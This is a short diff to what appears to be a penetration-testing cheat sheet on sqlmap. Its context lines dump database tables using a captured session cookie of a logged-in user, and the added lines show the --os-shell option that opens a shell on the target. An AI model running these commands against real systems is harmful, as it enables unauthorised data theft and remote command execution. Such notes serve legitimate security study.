@@ -53,5 +53,9 @@ $ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME
 ````
 $ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --dump #dump tables
 ````
------------------------------------
 
+````
+$ sqlmap -u "URL" --cookie="captured cookie of looged in user" --os-shell
+````
+
+Last one will give us a shell and with ````help```` cmd we can see all the commands.
